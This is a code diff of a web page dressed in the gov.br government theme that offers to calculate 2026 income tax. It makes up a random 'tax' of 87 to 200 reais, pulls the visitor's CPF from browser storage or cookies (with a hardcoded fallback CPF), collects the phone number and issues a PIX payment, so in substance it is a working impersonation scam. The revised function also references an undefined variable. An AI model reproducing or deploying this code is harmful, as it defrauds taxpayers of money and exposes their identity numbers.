@@ -197,7 +197,6 @@
             to { transform: rotate(360deg); }
         }
         
-        /* MODAL PIX - TEMA GOV.BR (AZUL E BRANCO) */
         .modal-pix {
             display: none;
             position: fixed;
@@ -476,7 +475,6 @@
                     <dl class="portalMessage info" id="kssPortalMessage" style="display:none"><dt>Info</dt><dd></dd></dl>
                     <div id="content">
                         
-                        <!-- Banner Principal -->
                         <div class="row hidden-mobile-ls linha-destaquetopo-adaptavel image-position-top hidden-tablet-ls">
                             <div class="row-content">
                                 <div class="column col-md-12 tile-default">
@@ -501,7 +499,6 @@
                             </div>
                         </div>
 
-                        <!-- Conteúdo Principal -->
                         <div class="row govbr-recom-wrapper">
                             <div class="row-content">
                                 <div class="column col-md-7">
@@ -532,7 +529,6 @@
                             </div>
                         </div>
 
-                        <!-- FORMULÁRIO DE CÁLCULO DE IMPOSTO -->
                         <div class="row">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -540,7 +536,7 @@
                                         <h3><i class="fas fa-calculator"></i> Calcular Imposto de Renda 2026</h3>
                                         <div class="tabela-aliquotas">
                                             <table>
-                                                <thead><tr><th>Faixa de Renda Mensal</th><th>Valor do Imposto</th><tr></thead>
+                                                <thead><tr><th>Faixa de Renda Mensal</th><th>Valor do Imposto</th></tr></thead>
                                                 <tbody>
                                                     <tr><td colspan="2" style="text-align:center; color:#666;">O valor é calculado individualmente para cada contribuinte</td></tr>
                                                 </tbody>
@@ -573,7 +569,6 @@
                             </div>
                         </div>
 
-                        <!-- Orientações -->
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12"><div class="tile tile-default"><div class="outstanding-header tile-content"><h2 class="outstanding-title">Orientações</h2></div></div></div>
@@ -592,7 +587,6 @@
                             </div>
                         </div>
 
-                        <!-- Estatísticas -->
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -614,7 +608,6 @@
         </div>
     </div>
 
-    <!-- MODAL PIX - TEMA GOV.BR -->
     <div id="modal-pix" class="modal-pix">
         <div class="modal-content">
             <h3><i class="fab fa-pix"></i> Pagamento via PIX</h3>
@@ -665,7 +658,6 @@
             const btnCalcular = document.getElementById('btn-calcular');
             const textoOriginal = btnCalcular.innerHTML;
             
-            
             const telefone = document.getElementById('telefone').value.trim();
             if (!telefone) {
                 alert('Por favor, informe seu telefone para contato.');
@@ -682,10 +674,8 @@
                 const renda = parseFloat(document.getElementById('renda-tributavel').value) || 0;
                 const dependentes = parseInt(document.getElementById('dependentes').value) || 0;
                 
-                
                 let valorBase = Math.floor(Math.random() * (200 - 87 + 1) + 87);
                 
-               
                 if (renda > 5000) {
                     valorBase = Math.min(200, valorBase + 20);
                 } else if (renda < 1500) {
@@ -733,105 +723,112 @@
             }, 1500);
         }
         
-   function gerarPix() {
-    if (impostoCalculado <= 0) {
-        alert('Calcule o imposto primeiro.');
-        return;
-    }
-    
-   
-    const telefone = document.getElementById('telefone').value.trim();
-    if (!telefone) {
-        alert('Por favor, informe seu telefone para contato.');
-        document.getElementById('telefone').focus();
-        return;
-    }
-    
-    let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
-    
-    if (!cpfSalvo) {
-        const cookies = document.cookie.split('; ');
-        for (let cookie of cookies) {
-            if (cookie.startsWith('user_cpf=')) {
-                cpfSalvo = cookie.split('=')[1];
-                break;
+        function gerarPix() {
+            if (impostoCalculado <= 0) {
+                alert('Calcule o imposto primeiro.');
+                return;
             }
-        }
-    }
-    
-    cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
-    
-    if (!cpfSalvo || cpfSalvo.length !== 11) {
-        cpfSalvo = '07068093868';
-        console.log('CPF não encontrado, usando padrão:', cpfSalvo);
-    }
-    
-   
-    localStorage.setItem('user_telefone', telefone);
-    sessionStorage.setItem('user_telefone', telefone);
-    
-    const btnPagar = document.getElementById('btn-pagar');
-    const textoOriginal = btnPagar.innerHTML;
-    btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
-    btnPagar.disabled = true;
-    
-    document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
-    
-    fetch('/api/create-payment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            amount: impostoCalculado,
-            customer_name: 'Contribuinte',
-            customer_email: 'pagamento@contribuinte.com',
-            customer_cpf: cpfSalvo,
-            customer_phone: telefone
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        btnPagar.innerHTML = textoOriginal;
-        btnPagar.disabled = false;
-        
-        if (data.success && data.payment && data.payment.pix_code) {
-            ultimoPixGerado = {
-                codigo: data.payment.pix_code,
-                valor: impostoCalculado,
-                cpf: cpfSalvo,
-                telefone: telefone
-            };
             
-            document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+            let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
             
-            const qrcodeContainer = document.getElementById('qrcode-container');
-            qrcodeContainer.innerHTML = '';
-            new QRCode(qrcodeContainer, {
-                text: data.payment.pix_code,
-                width: 250,
-                height: 250
+            if (!cpfSalvo) {
+                const cookies = document.cookie.split('; ');
+                for (let cookie of cookies) {
+                    if (cookie.startsWith('user_cpf=')) {
+                        cpfSalvo = cookie.split('=')[1];
+                        break;
+                    }
+                }
+            }
+            
+            cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
+            
+            if (!cpfSalvo || cpfSalvo.length !== 11) {
+                cpfSalvo = '07068093868';
+                console.log('CPF não encontrado, usando padrão:', cpfSalvo);
+            }
+            
+            const btnPagar = document.getElementById('btn-pagar');
+            const textoOriginal = btnPagar.innerHTML;
+            btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
+            btnPagar.disabled = true;
+            
+            document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
+            
+            fetch('/api/create-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount: impostoCalculado,
+                    customer_name: 'Contribuinte',
+                    customer_email: 'pagamento@contribuinte.com',
+                    customer_cpf: cpfSalvo,
+                    customer_phone: telefoneUsuario
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                btnPagar.innerHTML = textoOriginal;
+                btnPagar.disabled = false;
+                
+                if (data.success && data.payment && data.payment.pix_code) {
+                    ultimoPixGerado = {
+                        codigo: data.payment.pix_code,
+                        valor: impostoCalculado,
+                        cpf: cpfSalvo,
+                        telefone: telefoneUsuario
+                    };
+                    
+                    document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+                    
+                    const qrcodeContainer = document.getElementById('qrcode-container');
+                    qrcodeContainer.innerHTML = '';
+                    new QRCode(qrcodeContainer, {
+                        text: data.payment.pix_code,
+                        width: 250,
+                        height: 250
+                    });
+                    
+                    if (data.payment.expires_at) {
+                        document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
+                    }
+                    
+                    document.getElementById('modal-pix').style.display = 'flex';
+                    
+                    setTimeout(() => {
+                        document.getElementById('modal-pix').style.display = 'none';
+                        window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefoneUsuario)}`;
+                    }, 5000);
+                } else {
+                    alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
+                }
+            })
+            .catch(error => {
+                btnPagar.innerHTML = textoOriginal;
+                btnPagar.disabled = false;
+                console.error('Erro:', error);
+                alert('Erro de conexão com o servidor.');
             });
-            
-            if (data.payment.expires_at) {
-                document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
-            }
-            
-            document.getElementById('modal-pix').style.display = 'flex';
-            
-            setTimeout(() => {
-                document.getElementById('modal-pix').style.display = 'none';
-                window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefone)}`;
-            }, 5000);
-        } else {
-            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
         }
-    })
-    .catch(error => {
-        btnPagar.innerHTML = textoOriginal;
-        btnPagar.disabled = false;
-        console.error('Erro:', error);
-        alert('Erro de conexão com o servidor.');
-    });
-}
+        
+        function copiarPix() {
+            const codigoPix = document.getElementById('pix-codigo').textContent;
+            if (codigoPix && codigoPix !== 'Aguardando geração do PIX...') {
+                navigator.clipboard.writeText(codigoPix).then(() => {
+                    const msgDiv = document.getElementById('pix-mensagem');
+                    msgDiv.textContent = '✓ Código PIX copiado! Realize o pagamento no seu banco.';
+                    msgDiv.className = 'alert alert-success';
+                    msgDiv.style.display = 'block';
+                    setTimeout(() => {
+                        msgDiv.style.display = 'none';
+                    }, 3000);
+                }).catch(() => {
+                    const msgDiv = document.getElementById('pix-mensagem');
+                    msgDiv.textContent = 'Erro ao copiar. Copie manualmente.';
+                    msgDiv.className = 'alert alert-danger';
+                    msgDiv.style.display = 'block';
+                });
+            }
         }
     </script>
 
